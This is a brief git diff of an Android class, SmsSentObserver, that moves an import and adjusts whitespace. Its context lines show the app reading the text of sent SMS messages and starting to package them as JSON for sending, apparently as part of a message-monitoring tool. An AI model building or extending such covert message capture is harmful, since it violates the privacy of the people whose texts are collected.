@@ -12,8 +12,8 @@ import android.net.Uri;
 import android.os.Handler;
 import android.preference.PreferenceManager;
 
-import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.request.DataRequest;
+import com.inet.android.request.RequestMakerImpl;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
@@ -27,7 +27,7 @@ public class SmsSentObserver extends ContentObserver {
 	RequestMakerImpl req;
 	private static long id = 0;
 	Handler handler;
-	
+
 	public SmsSentObserver(Handler handler, Context ctx) {
 		super(handler);
 		mContext = ctx;
@@ -93,6 +93,7 @@ public class SmsSentObserver extends ContentObserver {
 								String message = sms_sent_cursor
 										.getString(sms_sent_cursor
 												.getColumnIndex("body"));
+
 								// -------send sms----------------------------
 								String sendJSONStr = null;
 								JSONObject jsonObject = new JSONObject();
